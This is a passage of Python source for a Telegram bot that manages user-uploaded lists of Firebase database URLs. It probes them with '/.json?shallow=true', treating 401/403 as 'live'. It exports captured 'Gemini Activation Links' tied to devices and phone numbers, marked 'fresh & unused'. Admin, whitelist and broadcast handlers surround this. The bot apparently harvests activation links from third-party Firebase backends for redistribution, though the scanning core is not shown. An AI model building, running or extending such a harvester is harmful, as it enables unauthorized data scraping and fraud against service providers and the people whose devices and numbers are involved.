                            parse_mode=ParseMode.HTML
                        )
                        if msg:
                            await safe_telegram_call(context.bot.pin_chat_message, chat_id=master_storage, message_id=msg.message_id)
                except Exception as e:
                    logger.debug(f"Could not forward master panels backup to storage: {e}")

        u_settings = load_user_settings(user_id)
        u_settings["panels_file_id"] = doc.file_id
        save_user_settings(user_id, u_settings)

        user_storage = admin_manager.get_effective_storage_channel(user_id)
        user_pfile = get_user_panels_file(user_id)
        if user_storage and user_pfile.exists() and added > 0:
            try:
                date, tm = get_current_time()
                u_fname = (user.first_name or "User") if user else "User"
                with open(user_pfile, "rb") as f_backup:
                    msg = await safe_telegram_call(
                        context.bot.send_document,
                        chat_id=user_storage,
                        document=f_backup,
                        filename="panels.txt",
                        caption=(
                            f"📦 <b>Panels Backup Stored (Unique Only)</b>\n"
                            f"• User: <code>{user_id}</code> ({html.escape(u_fname)})\n"
                            f"• Added: <code>+{added}</code>\n"
                            f"• Duplicates Filtered: <code>{duplicates}</code>\n"
                            f"• Total Active: <code>{total}</code>\n"
                            f"• Date: <code>{date} {tm} (IST)</code>"
                        ),
                        parse_mode=ParseMode.HTML
                    )
                if msg:
                    await safe_telegram_call(context.bot.pin_chat_message, chat_id=user_storage, message_id=msg.message_id)
            except Exception as e:
                logger.debug(f"Could not forward panels backup to storage: {e}")

        storage_tip = ""
        if not admin_manager.is_super_admin(user_id) and not admin_manager.has_storage_channel(user_id):
            storage_tip = "\n\n⚠️ <b>Next step:</b> Link your storage channel using <code>/setstorage &lt;channel_id&gt;</code> before scanning!"

        if added > 0:
            await safe_telegram_call(
                message.reply_text,
                f"✅ <b>Successfully processed panels into your private workspace!</b>\n\n"
                f"• <b>Added:</b> <code>+{added}</code> new unique\n"
                f"• <b>Duplicates Filtered:</b> <code>{duplicates}</code>\n"
                f"• <b>Total Active:</b> <code>{total}</code>\n"
                f"• <b>Cloud Backup:</b> Synchronized ☁️"
                f"{storage_tip}\n\n"
                f"Run /scan to start scanning.",
                parse_mode=ParseMode.HTML
            )
        else:
            await safe_telegram_call(
                message.reply_text,
                f"ℹ️ <b>No New Panels Added!</b>\n\n"
                f"All <code>{duplicates}</code> link(s) in the file already exist in your workspace.\n"
                f"• <b>Total Active:</b> <code>{total}</code>\n"
                f"• <b>Duplicates Filtered:</b> <code>{duplicates}</code>"
                f"{storage_tip}\n\n"
                f"Run /scan to start scanning.",
                parse_mode=ParseMode.HTML
            )
    except Exception as e:
        logger.error(f"Error downloading panels file: {e}", exc_info=True)
        await message.reply_text(f"❌ Upload failed: <code>{html.escape(str(e))}</code>", parse_mode=ParseMode.HTML)
    finally:
        if temp_path.exists():
            try:
                temp_path.unlink()
            except Exception:
                pass
    return ConversationHandler.END


async def upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        await safe_answer(update, "Upload cancelled.")
        await show_panels_menu(update, context)
    else:
        await update.effective_message.reply_text("❌ Upload cancelled.")
    return ConversationHandler.END

# ============ SUPER ADMIN SUITE ============
async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_admin_menu(update, context)

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.is_admin(user_id):
        await update.effective_message.reply_text("⛔ <b>Admin Access Required</b>", parse_mode=ParseMode.HTML)
        return

    accounts = admin_manager.get_all_accounts()
    if not accounts:
        await update.effective_message.reply_text("ℹ️ No registered users yet.", parse_mode=ParseMode.HTML)
        return

    lines = ["👥 <b>Registered Users & Roles:</b>\n"]
    for acc in accounts[:25]:
        u_tag = f"@{acc['username']}" if acc.get('username') else (acc.get('first_name') or f"User_{acc.get('user_id')}")
        lines.append(f"• <code>{acc['user_id']}</code> | {acc['role']} | {html.escape(u_tag)}")

    if len(accounts) > 25:
        lines.append(f"\n<i>... and {len(accounts) - 25} more users</i>")

    keyboard = [[InlineKeyboardButton("🔙 Admin Menu", callback_data='menu_admin')]]
    markup = InlineKeyboardMarkup(keyboard)
    await send_or_edit(update, "\n".join(lines), reply_markup=markup)

async def adduser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.is_admin(user_id):
        await update.effective_message.reply_text("⛔ <b>Admin Access Required</b>", parse_mode=ParseMode.HTML)
        return

    if not context.args or not context.args[0].lstrip("-").isdigit():
        await update.effective_message.reply_text("Usage: <code>/adduser &lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
        return

    target_id = int(context.args[0])
    if target_id <= 0:
        await update.effective_message.reply_text("❌ Please enter a valid positive Telegram user ID.", parse_mode=ParseMode.HTML)
        return

    if admin_manager.is_super_admin(target_id):
        await update.effective_message.reply_text(f"👑 User <code>{target_id}</code> is the Super Admin / Owner.", parse_mode=ParseMode.HTML)
        return

    if admin_manager.is_admin(target_id):
        await update.effective_message.reply_text(f"🛡️ User <code>{target_id}</code> is already an Admin!", parse_mode=ParseMode.HTML)
        return

    admin_manager.add_user(target_id)
    await update.effective_message.reply_text(f"✅ User <code>{target_id}</code> added to Whitelist!", parse_mode=ParseMode.HTML)

async def deluser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.is_admin(user_id):
        await update.effective_message.reply_text("⛔ <b>Admin Access Required</b>", parse_mode=ParseMode.HTML)
        return

    if not context.args or not context.args[0].lstrip("-").isdigit():
        await update.effective_message.reply_text("Usage: <code>/deluser &lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
        return

    target_id = int(context.args[0])
    if target_id <= 0:
        await update.effective_message.reply_text("❌ Please enter a valid positive Telegram user ID.", parse_mode=ParseMode.HTML)
        return

    if admin_manager.is_super_admin(target_id):
        await update.effective_message.reply_text("❌ Cannot remove the Super Admin / Owner.", parse_mode=ParseMode.HTML)
        return

    if admin_manager.is_admin(target_id):
        if not admin_manager.is_super_admin(user_id):
            await update.effective_message.reply_text("⛔ Only the Super Admin can demote or remove other Admins.", parse_mode=ParseMode.HTML)
            return
        admin_manager.remove_admin(target_id)
        admin_manager.remove_user(target_id)
        await update.effective_message.reply_text(f"⚪ Admin <code>{target_id}</code> demoted and removed.", parse_mode=ParseMode.HTML)
        return

    admin_manager.remove_user(target_id)
    await update.effective_message.reply_text(f"⚪ User <code>{target_id}</code> removed from Whitelist.", parse_mode=ParseMode.HTML)

async def addadmin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.is_super_admin(user_id):
        await update.effective_message.reply_text("⛔ <b>Super Admin Access Required</b>", parse_mode=ParseMode.HTML)
        return

    if not context.args or not context.args[0].lstrip("-").isdigit():
        await update.effective_message.reply_text("Usage: <code>/addadmin &lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
        return

    target_id = int(context.args[0])
    if target_id <= 0:
        await update.effective_message.reply_text("❌ Please enter a valid positive Telegram user ID.", parse_mode=ParseMode.HTML)
        return
    admin_manager.add_admin(target_id)
    await update.effective_message.reply_text(f"👑 User <code>{target_id}</code> promoted to Admin!", parse_mode=ParseMode.HTML)

async def deladmin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.is_super_admin(user_id):
        await update.effective_message.reply_text("⛔ <b>Super Admin Access Required</b>", parse_mode=ParseMode.HTML)
        return

    if not context.args or not context.args[0].lstrip("-").isdigit():
        await update.effective_message.reply_text("Usage: <code>/deladmin &lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
        return

    target_id = int(context.args[0])
    if target_id == admin_manager.super_admin_id:
        await update.effective_message.reply_text("❌ Cannot remove Super Admin!", parse_mode=ParseMode.HTML)
        return
    if target_id <= 0:
        await update.effective_message.reply_text("❌ Please enter a valid positive Telegram user ID.", parse_mode=ParseMode.HTML)
        return
    admin_manager.remove_admin(target_id)
    await update.effective_message.reply_text(f"⚪ Admin <code>{target_id}</code> demoted.", parse_mode=ParseMode.HTML)

async def freemode_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.is_super_admin(user_id):
        await update.effective_message.reply_text("⛔ <b>Super Admin / Owner Access Required</b>", parse_mode=ParseMode.HTML)
        return

    new_state = admin_manager.toggle_free_mode()
    txt = "🟢 <b>Free Mode ENABLED!</b> All Telegram users can now access the bot." if new_state else "🔴 <b>Free Mode DISABLED!</b> Only whitelisted members can use the bot."
    await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML)

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.is_super_admin(user_id):
        await update.effective_message.reply_text("⛔ <b>Super Admin / Owner Access Required</b>", parse_mode=ParseMode.HTML)
        return

    if not context.args:
        await update.effective_message.reply_text("Usage: <code>/broadcast &lt;message&gt;</code>", parse_mode=ParseMode.HTML)
        return

    broadcast_text = " ".join(context.args)
    targets = admin_manager.get_all_target_chat_ids()
    sent = 0

    status_msg = await safe_telegram_call(update.effective_message.reply_text, f"📢 Broadcasting to {len(targets)} recipients...", parse_mode=ParseMode.HTML)
    for cid in targets:
        try:
            res = await safe_telegram_call(
                context.bot.send_message,
                chat_id=cid,
                text=f"📢 <b>Announcement:</b>\n\n{html.escape(broadcast_text)}",
                parse_mode=ParseMode.HTML
            )
            if res is not None:
                sent += 1
            await asyncio.sleep(0.1)
        except Exception:
            continue

    if status_msg:
        try:
            await safe_telegram_call(status_msg.edit_text, f"✅ Broadcast sent to <b>{sent}/{len(targets)}</b> users!", parse_mode=ParseMode.HTML)
        except Exception:
            await safe_telegram_call(update.effective_message.reply_text, f"✅ Broadcast sent to <b>{sent}/{len(targets)}</b> users!", parse_mode=ParseMode.HTML)
    else:
        await safe_telegram_call(update.effective_message.reply_text, f"✅ Broadcast sent to <b>{sent}/{len(targets)}</b> users!", parse_mode=ParseMode.HTML)

async def cleanup_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.is_super_admin(user_id):
        if update.callback_query:
            await safe_answer(update, "⛔ Super Admin / Owner Access Required", show_alert=True)
        else:
            await update.effective_message.reply_text("⛔ <b>Super Admin / Owner Access Required</b>", parse_mode=ParseMode.HTML)
        return

    cleaned_count = 0
    for pattern in ("*.tmp*", "temp_upload_*"):
        for p in BASE_DIR.glob(pattern):
            try:
                p.unlink()
                cleaned_count += 1
            except Exception:
                pass

    if USER_DATA_DIR.exists():
        for p in USER_DATA_DIR.glob("**/*.tmp*"):
            try:
                p.unlink()
                cleaned_count += 1
            except Exception:
                pass

    cleared_logs = 0
    while not log_queue.empty():
        try:
            log_queue.get_nowait()
            cleared_logs += 1
        except Exception:
            break

    force_memory_cleanup()
    summary_text = (
        f"🧹 <b>System Cleanup Complete!</b>\n\n"
        f"• Temp Files Pruned: <code>{cleaned_count}</code>\n"
        f"• Stale Logs Flushed: <code>{cleared_logs}</code>\n"
        f"• RAM Garbage Collected: ✅"
    )
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("👑 Admin Menu", callback_data='menu_admin'), InlineKeyboardButton("🔙 Main Menu", callback_data='start_menu')]
    ])
    if update.callback_query:
        await safe_answer(update, "Cleanup completed! 🧹")
    await send_or_edit(update, summary_text, reply_markup=keyboard)

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    user = update.effective_user
    chat_type = chat.type.capitalize() if chat else "Private"
    cid = chat.id if chat else "Unknown"
    msg = update.effective_message
    if not msg:
        return

    if chat and chat.type == "channel":
        title = chat.title or "Channel"
        await msg.reply_text(
            f"🆔 <b>Channel Identifier:</b>\n\n"
            f"• <b>Channel ID:</b> <code>{cid}</code>\n"
            f"• <b>Title:</b> {html.escape(title)}\n\n"
            f"👉 <b>To link as your Private Storage Channel:</b>\n"
            f"Send this in your private chat with the bot:\n"
            f"<code>/setstorage {cid}</code>\n\n"
            f"👉 <b>To link as your Log Channel:</b>\n"
            f"<code>/setchannel {cid}</code>",
            parse_mode=ParseMode.HTML
        )
        return

    uid = user.id if user else "Unknown"
    u_name = f"@{user.username}" if (user and user.username) else ((user.first_name or "User") if user else "User")
    await msg.reply_text(
        f"🆔 <b>Chat & User Identifier:</b>\n\n"
        f"• <b>Current Chat ID:</b> <code>{cid}</code> ({chat_type})\n"
        f"• <b>Your User ID:</b> <code>{uid}</code>\n"
        f"• <b>User:</b> {html.escape(u_name)}",
        parse_mode=ParseMode.HTML
    )

async def results_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.has_access(user_id):
        if update.callback_query:
            await safe_answer(update, "⛔ Not authorized", show_alert=True)
        else:
            await update.effective_message.reply_text("⛔ <b>Not authorized</b>", parse_mode=ParseMode.HTML)
        return

    sent = False
    links_file = get_user_links_file(user_id)
    results_file = get_user_results_file(user_id)
    if links_file.exists() and links_file.stat().st_size > 0:
        try:
            with open(links_file, "rb") as f:
                await safe_telegram_call(update.effective_message.reply_document, f, filename="gemini_activation_links.txt", caption="🔗 Gemini Activation Links")
            sent = True
        except Exception as e:
            logger.debug(f"Error replying with links file: {e}")
    if results_file.exists() and results_file.stat().st_size > 0:
        try:
            with open(results_file, "rb") as f:
                await safe_telegram_call(update.effective_message.reply_document, f, filename="gemini_results.csv", caption="📊 Detailed Results CSV")
            sent = True
        except Exception as e:
            logger.debug(f"Error replying with results CSV: {e}")
    if sent and update.callback_query:
        try:
            await safe_answer(update)
        except Exception:
            pass
    elif not sent:
        if update.callback_query:
            await safe_answer(update, "ℹ️ No results generated yet in your workspace. Run /scan first.", show_alert=True)
        else:
            await update.effective_message.reply_text("ℹ️ No results generated yet in your workspace. Run /scan first.", parse_mode=ParseMode.HTML)

# ============ PANEL HEALTH DIAGNOSTIC ============
def _check_panel_health(panel_url: str) -> bool:
    try:
        cleaned = clean_url(panel_url)
        if not cleaned:
            return False
        url = cleaned.rstrip("/") + "/.json?shallow=true"
        with requests.get(url, timeout=3.5) as resp:
            # 200 or 401/403 (Permission Denied confirms the node is live and responding)
            return resp.status_code in (200, 401, 403)
    except Exception:
        return False

async def panels_ping_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.has_access(user_id):
        if query:
            await safe_answer(query, "⛔ Not authorized", show_alert=True)
        return

    panels = load_panels(user_id)
    if not panels:
        if query:
            await safe_answer(query, "❌ No panels loaded in your workspace to test!", show_alert=True)
        else:
            await update.effective_message.reply_text("❌ No panels loaded in your workspace yet. Upload panels first.", parse_mode=ParseMode.HTML)
        return

    if query:
        await safe_answer(query, "Testing panel connections... ⚡")

    init_msg = await send_or_edit(
        update,
        f"🧪 <b>Testing {len(panels)} Panels in Parallel...</b>\n⏳ <i>Connecting to Firebase nodes...</i>"
    )

    t0 = time.time()
    urls = [p[0] for p in panels]

    loop = asyncio.get_running_loop()
    futs = [loop.run_in_executor(_SCAN_EXECUTOR, _check_panel_health, u) for u in urls]
    results_raw = await asyncio.gather(*futs, return_exceptions=True)
    results = [bool(r) if not isinstance(r, Exception) else False for r in results_raw]

    online_count = sum(1 for r in results if r)
    offline_count = len(results) - online_count
    elapsed_ms = int((time.time() - t0) * 1000)
    avg_ms = int(elapsed_ms / max(len(panels), 1))

    status_icon = "🟢" if offline_count == 0 else ("🟡" if online_count > 0 else "🔴")
    summary = f"""🧪 <b>Panel Health Diagnostic Complete</b> {status_icon}

• <b>Total Panels Tested:</b> <code>{len(panels)}</code>
• <b>Online & Reachable 🟢:</b> <code>{online_count}</code>
• <b>Unreachable / Timeout 🔴:</b> <code>{offline_count}</code>
• <b>Average Latency:</b> <code>~{avg_ms}ms</code>

{"⚡ <i>All panels are operational and ready for scanning!</i>" if offline_count == 0 else "⚠️ <i>Some panels did not respond. Scanner will automatically prioritize responsive panels.</i>"}"""

    keyboard = [
        [InlineKeyboardButton("🚀 Start Scan", callback_data='scan'), InlineKeyboardButton("📋 View Panels", callback_data='panels_menu')],
        [InlineKeyboardButton("🔙 Back to Panels", callback_data='menu_panels')]
    ]
    if init_msg:
        try:
            await init_msg.edit_text(summary, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))
            return
        except Exception:
            pass
    await send_or_edit(update, summary, reply_markup=InlineKeyboardMarkup(keyboard))

# ============ EXPORT HUB ============
async def show_export_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.has_access(user_id):
        if update.callback_query:
            await safe_answer(update, "⛔ Not authorized", show_alert=True)
        return

    links_file = get_user_links_file(user_id)
    fresh_file = get_user_fresh_links_file(user_id)
    proc_dict = load_processed_numbers(user_id)

    total_links = 0
    if links_file.exists():
        links = [l for l in links_file.read_text(encoding="utf-8", errors="ignore").splitlines() if l.strip()]
        total_links = len(links)

    fresh_links_cnt = 0
    if fresh_file.exists():
        f_links = [l for l in fresh_file.read_text(encoding="utf-8", errors="ignore").splitlines() if l.strip()]
        fresh_links_cnt = len(f_links)

    cached_cnt = len(_PROCESSED_CACHE) if _PROCESSED_CACHE else len(proc_dict)
    text = f"""📥 <b>Download & Export Center</b>

• 🎯 <b>Fresh Links (Latest Scan):</b> <code>{fresh_links_cnt}</code> (100% Unused)
• 📦 <b>All-Time Lifetime Archive:</b> <code>{total_links}</code>
• 🛡️ <b>Deduplication Shield:</b> <code>{cached_cnt}</code> Known Devices (Auto-Skipped)

<i>Select an export option below to download immediately:</i>"""

    keyboard = [
        [InlineKeyboardButton("🎯 Fresh Links (Latest Scan)", callback_data='export_fresh'), InlineKeyboardButton("📄 All Links (Archive)", callback_data='export_all')],
        [InlineKeyboardButton("✂️ First 50 Fresh", callback_data='export_50'), InlineKeyboardButton("📦 Remaining Fresh", callback_data='export_rem')],
        [InlineKeyboardButton("📊 Results Sheet (.csv)", callback_data='results'), InlineKeyboardButton("🧹 Clear Blacklist Cache", callback_data='export_clear')],
        [InlineKeyboardButton("🔙 Back to Main Menu", callback_data='start_menu')]
    ]
    markup = InlineKeyboardMarkup(keyboard)
    await send_or_edit(update, text, reply_markup=markup)

async def export_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_export_menu(update, context)

async def handle_export_fresh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = update.effective_user
    user_id = user.id if user else 0
    fresh_file = get_user_fresh_links_file(user_id)
    if not fresh_file.exists() or fresh_file.stat().st_size == 0:
        if query:
            await safe_answer(query, "❌ No fresh links found from your latest scan run! Use All Links or run a new scan.", show_alert=True)
        else:
            await update.effective_message.reply_text("❌ No fresh links found from your latest scan run. Use All Links to view previous archive.", parse_mode=ParseMode.HTML)
        return

    if query:
        await safe_answer(query, "Sending fresh activation links... 🎯")

    try:
        fresh_links = [l for l in fresh_file.read_text(encoding="utf-8", errors="ignore").splitlines() if l.strip()]
        with open(fresh_file, "rb") as f:
            await safe_telegram_call(
                update.effective_message.reply_document,
                document=f,
                filename="fresh_activation_links.txt",
                caption=f"🎯 <b>Fresh Gemini Activation Links ({len(fresh_links)} Links)</b>\n\n• Status: 🟢 100% Fresh & Unused\n💡 <i>Exclusively from your latest scan session!</i>",
                parse_mode=ParseMode.HTML
            )
    except Exception as e:
        logger.debug(f"Error in handle_export_fresh: {e}")

async def handle_export_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = update.effective_user
    user_id = user.id if user else 0
    links_file = get_user_links_file(user_id)
    if not links_file.exists() or links_file.stat().st_size == 0:
        if query:
            await safe_answer(query, "❌ No activation links found yet in your workspace!", show_alert=True)
        else:
            await update.effective_message.reply_text("❌ No activation links found yet in your workspace.", parse_mode=ParseMode.HTML)
        return

    if query:
        await safe_answer(query, "Sending all activation links... 📄")

    try:
        with open(links_file, "rb") as f:
            await safe_telegram_call(
                update.effective_message.reply_document,
                document=f,
                filename="gemini_activation_links.txt",
                caption="🔗 <b>All Captured Gemini Activation Links (Lifetime Archive)</b>",
                parse_mode=ParseMode.HTML
            )
    except Exception as e:
        logger.debug(f"Error in handle_export_all: {e}")

async def handle_export_50(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = update.effective_user
    user_id = user.id if user else 0
    target_f = get_user_fresh_links_file(user_id)
    is_fresh = True
    if not target_f.exists() or target_f.stat().st_size == 0:
        target_f = get_user_links_file(user_id)
        is_fresh = False

    if not target_f.exists() or target_f.stat().st_size == 0:
        if query:
            await safe_answer(query, "❌ No activation links found yet in your workspace!", show_alert=True)
        return

    links = [l for l in target_f.read_text(encoding="utf-8", errors="ignore").splitlines() if l.strip()]
    if not links:
        if query:
            await safe_answer(query, "❌ Links file is empty!", show_alert=True)
        return

    if query:
        await safe_answer(query, "Preparing First 50 Batch... ✂️")

    batch = links[:50]
    serialized = [f"{i}. {u}" for i, u in enumerate(batch, 1)]
    content = "\n".join(serialized) + "\n"

    buf = io.BytesIO(content.encode("utf-8"))
    buf.name = f"TO-Use-{len(batch)}.txt"
    buf.seek(0)

    try:
        tag = "Fresh" if is_fresh else "Archive"
        await safe_telegram_call(
            update.effective_message.reply_document,
            document=buf,
            filename=f"TO-Use-{len(batch)}.txt",
            caption=f"✂️ <b>First {len(batch)} {tag} Links</b> (Serial 1 to {len(batch)})\n• Status: 🟢 Fresh & Unused",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        logger.debug(f"Error in handle_export_50: {e}")

async def handle_export_rem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = update.effective_user
    user_id = user.id if user else 0
    target_f = get_user_fresh_links_file(user_id)
    is_fresh = True
    if not target_f.exists() or target_f.stat().st_size == 0:
        target_f = get_user_links_file(user_id)
        is_fresh = False

    if not target_f.exists() or target_f.stat().st_size == 0:
        if query:
            await safe_answer(query, "❌ No activation links found yet in your workspace!", show_alert=True)
        return

    links = [l for l in target_f.read_text(encoding="utf-8", errors="ignore").splitlines() if l.strip()]
    if len(links) <= 50:
        if query:
            await safe_answer(query, f"ℹ️ Total links is {len(links)}, so no remaining batch beyond 50.", show_alert=True)
        return

    if query:
        await safe_answer(query, "Preparing Remaining Batch... 📦")

    batch = links[50:]
    serialized = [f"{i}. {u}" for i, u in enumerate(batch, 1)]
    content = "\n".join(serialized) + "\n"

    buf = io.BytesIO(content.encode("utf-8"))
    filename = f"TO-BE_used(REMAINING-{len(batch)}).txt"
    buf.name = filename
    buf.seek(0)

    try:
        tag = "Fresh" if is_fresh else "Archive"
        await safe_telegram_call(
            update.effective_message.reply_document,
            document=buf,
            filename=filename,
            caption=f"📦 <b>Remaining {tag} Links</b> ({len(batch)} links, Serial 1 to {len(batch)})\n• Status: 🟢 Fresh & Unused",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        logger.debug(f"Error in handle_export_rem: {e}")

async def handle_export_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = update.effective_user
    user_id = user.id if user else 0
    clear_processed_numbers(user_id)
    if query:
        await safe_answer(query, "🧹 Cooldown Cache Cleared! All devices & panels are now 100% re-eligible for scanning.", show_alert=True)
    await show_export_menu(update, context)

async def clearcooldown_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id if update.effective_user else 0
    if not admin_manager.has_access(user_id):
        await update.effective_message.reply_text("⛔ Access Denied.")
        return
    clear_processed_numbers()
    await safe_telegram_call(
        update.effective_message.reply_text,
        text="🧹 <b>Deduplication Cooldown Cache Cleared!</b>\n\nAll Firebase panels and phone numbers are now 100% re-eligible for scanning.\nLifetime URL deduplication remains active to prevent any duplicate links from being delivered.",
        parse_mode=ParseMode.HTML
    )

# ============ CALLBACK QUERY BUTTON HANDLER ============
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return
    data = query.data
    user = update.effective_user
    user_id = user.id if user else 0

    try:
        if not admin_manager.has_access(user_id) and data not in ('btn_my_id', 'start_menu'):
            await safe_answer(query, "⛔ Access Denied! Contact @OwAtom to get access.", show_alert=True)
            await show_main_menu(update, context)
            return

        if data == 'start_menu':
            await safe_answer(query)
            await show_main_menu(update, context)
        elif data == 'menu_scanner':
            await safe_answer(query)
            await show_scanner_menu(update, context)
        elif data == 'menu_panels':
            await safe_answer(query)
            await show_panels_menu(update, context)
        elif data == 'upload':
            await safe_answer(query)
            await upload_start(update, context)
        elif data == 'cancel':
            await safe_answer(query)
            await upload_cancel(update, context)
        elif data == 'menu_export':
            await safe_answer(query)
            await show_export_menu(update, context)
        elif data == 'export_fresh':
            await safe_answer(query)
            await handle_export_fresh(update, context)
        elif data == 'export_all':
            await safe_answer(query)
            await handle_export_all(update, context)
        elif data == 'export_50':
            await safe_answer(query)
            await handle_export_50(update, context)
        elif data == 'export_rem':
            await safe_answer(query)
            await handle_export_rem(update, context)
        elif data == 'export_clear':
            await safe_answer(query)
            await handle_export_clear(update, context)
        elif data == 'panels_ping':
            await safe_answer(query)
            await panels_ping_cmd(update, context)
        elif data == 'menu_channels':
            await safe_answer(query)
            await show_channels_menu(update, context)
        elif data == 'menu_help':
            await safe_answer(query)
            await show_help_menu(update, context)
        elif data == 'btn_my_id':
            await safe_answer(query, f"Your User ID: {user_id}", show_alert=True)
        elif data == 'toggle_scan_mode':
            new_mode = toggle_user_scan_mode(user_id)
            if new_mode == "deep":
                await safe_answer(query, "Switched to Deep Mode: 2x Retry (15s)", show_alert=True)
            else:
                await safe_answer(query, "Switched to Turbo Mode: Ultra-Fast 1x (18s)", show_alert=True)
            await show_scanner_menu(update, context)
        elif data == 'scan':
            await safe_answer(query)
            await scan_cmd(update, context)
        elif data == 'scan_resume':
            await safe_answer(query)
            context.args = ["resume"]
            await scan_cmd(update, context)
        elif data == 'scan_fresh':
            await safe_answer(query)
            context.args = ["fresh"]
            await scan_cmd(update, context)
        elif data == 'scan_all':
            await safe_answer(query)
            context.args = ["all"]
            await scan_cmd(update, context)
        elif data == 'stop':
            await safe_answer(query)
            await stop_cmd(update, context)
        elif data == 'status':
            await safe_answer(query)
            await status_cmd(update, context, edit_message=True)
        elif data == 'channel':
            await safe_answer(query)
            await show_channels_menu(update, context)
        elif data == 'results':
            await safe_answer(query)
            await results_cmd(update, context)
        elif data == 'panels_menu':
            await safe_answer(query)
            await show_panels_menu(update, context)
        elif data == 'clear_panels':
            if not admin_manager.has_access(user_id):
                await safe_answer(query, "⛔ Not authorized", show_alert=True)
                return
            if user_id in active_scans and active_scans[user_id].is_active():
                await safe_answer(query, "⚠️ Please stop your running scan with /stop before clearing panels!", show_alert=True)
                return
            u_pfile = get_user_data_dir(user_id) / "panels.txt"
            try:
                with open(u_pfile, "w", encoding="utf-8") as f:
                    f.write("# Cleared\n")
            except Exception:
                pass
            if admin_manager.is_super_admin(user_id) and PANELS_FILE.exists():
                try:
                    with open(PANELS_FILE, "w", encoding="utf-8") as f:
                        f.write("# Cleared\n")
                except Exception:
                    pass
            await safe_answer(query, "🗑️ Your panels have been cleared!", show_alert=True)
            await show_panels_menu(update, context)
        elif data == 'restore_panels':
            ok = await restore_panels_from_storage(context.bot, user_id=user_id)
            ans_text = "✅ Restored panels from cloud storage!" if ok else "❌ Could not restore panels from cloud. Check your storage channel setup."
            await safe_answer(query, ans_text, show_alert=True)
            await show_panels_menu(update, context)
        elif data == 'admin_panel' or data == 'menu_admin':
            if not admin_manager.is_admin(user_id):
                await safe_answer(query, "⛔ Admin Access Required", show_alert=True)
                return
            await safe_answer(query)
            await show_admin_menu(update, context)
        elif data == 'users_list':
            if not admin_manager.is_admin(user_id):
                await safe_answer(query, "⛔ Admin Access Required", show_alert=True)
                return
            await safe_answer(query)
            await users_cmd(update, context)
        elif data == 'toggle_freemode':
            if not admin_manager.is_super_admin(user_id):
                await safe_answer(query, "⛔ Super Admin / Owner Access Required", show_alert=True)
                return
            new_state = admin_manager.toggle_free_mode()
            await safe_answer(query, f"Free Mode: {'ON' if new_state else 'OFF'}", show_alert=True)
            await show_admin_menu(update, context)
        elif data == 'cleanup':
            if not admin_manager.is_super_admin(user_id):
                await safe_answer(query, "⛔ Super Admin / Owner Access Required", show_alert=True)
                return
            await safe_answer(query)
            await cleanup_cmd(update, context)
        elif data == 'channel_test':
            if admin_manager.is_super_admin(user_id):
                ch_id = admin_manager.get_user_log_channel(user_id) or admin_manager.get_master_log_channel()
            else:
                ch_id = admin_manager.get_user_log_channel(user_id)

            if ch_id:
                try:
                    res = await safe_telegram_call(
                        context.bot.send_message,
                        chat_id=ch_id,
                        text="🧪 <b>Log Channel Ping</b>: Connection is active and healthy! 🚀",
                        parse_mode=ParseMode.HTML
                    )
                    if res is not None:
                        await safe_answer(query, "✅ Test ping sent to your channel!", show_alert=True)
                    else:
                        await safe_answer(query, "❌ Could not send ping. Check channel permissions!", show_alert=True)
                except Exception as e:
                    await safe_answer(query, f"❌ Error: {e}", show_alert=True)
            else:
                await safe_answer(query, "⚠️ No private log channel configured. Use /setchannel first.", show_alert=True)
        elif data == 'storage_test':
            st_ch = admin_manager.get_effective_storage_channel(user_id)
            if st_ch:
                try:
                    res = await safe_telegram_call(
                        context.bot.send_message,
                        chat_id=st_ch,
                        text="📦 <b>Storage Channel Ping</b>: Connection verified! Backups and links will be saved here. 🚀",
                        parse_mode=ParseMode.HTML
                    )
                    if res is not None:
                        await safe_answer(query, "✅ Test ping sent to your storage channel!", show_alert=True)
                    else:
                        await safe_answer(query, "❌ Could not send ping. Check storage channel permissions!", show_alert=True)
